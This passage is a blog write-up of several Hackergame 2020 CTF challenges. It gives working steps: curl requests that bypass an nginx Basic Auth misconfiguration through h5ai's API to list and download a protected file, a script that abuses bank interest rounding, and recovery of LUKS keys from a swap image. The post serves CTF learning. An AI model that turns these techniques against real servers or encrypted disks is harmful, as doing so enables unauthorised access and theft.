小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 